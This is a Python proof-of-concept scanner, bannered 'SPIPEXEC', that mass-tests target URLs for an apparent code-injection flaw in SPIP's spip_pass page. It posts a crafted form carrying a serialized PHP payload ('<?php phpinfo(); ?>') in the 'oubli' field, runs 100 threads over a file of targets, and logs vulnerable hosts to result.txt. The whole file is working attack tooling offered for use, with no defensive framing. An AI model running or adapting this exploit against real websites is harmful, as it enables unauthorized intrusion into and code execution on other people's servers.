import requests,sys,argparse,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
███████╗██████╗ ██╗██████╗ ███████╗██╗  ██╗███████╗ ██████╗
██╔════╝██╔══██╗██║██╔══██╗██╔════╝╚██╗██╔╝██╔════╝██╔════╝
███████╗██████╔╝██║██████╔╝█████╗   ╚███╔╝ █████╗  ██║     
╚════██║██╔═══╝ ██║██╔═══╝ ██╔══╝   ██╔██╗ ██╔══╝  ██║     
███████║██║     ██║██║     ███████╗██╔╝ ██╗███████╗╚██████╗
╚══════╝╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝
                                                           
                                            version: 1.0
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description='QLBSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/spip/spip.php?page=spip_pass"
    url = target+payload_url
    headers={
        'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Cookie': 'cibcInit=oui',
        'Content-Length': '204',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = 'page=spip_pass&formulaire_action=oubli&formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&oubli=s:19:"<?php phpinfo(); ?>";&nobot='
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        pattern = r"name='formulaire_action_args'\s+type='hidden'\s+value='([^']*)'"
        match = re.search(pattern, res.text)
        if res.status_code == 200 and match.group(1) !='' :
            print(f"[+]该url存在漏洞{target},\nToken为:{match.group(1)}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

if __name__ == '__main__':
    main()